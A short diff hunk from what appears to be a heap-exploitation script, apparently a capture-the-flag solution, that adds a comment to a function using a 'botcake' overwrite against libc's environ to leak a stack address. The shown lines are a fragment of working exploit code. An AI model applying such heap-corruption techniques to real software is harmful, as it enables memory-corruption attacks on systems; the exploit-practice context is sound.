@@ -138,7 +138,8 @@ def exploit(p,e,l):
     fd = libc_environ-0x18
 
     botcake_overwrite(p,i,size,key,fd,b"A"*0x18)
- 
+
+    # view libc.environ from overwritten chunk
     view(p,13)
     ru(p,b"A"*0x18)
     stack_leak = up(p.recv(6))
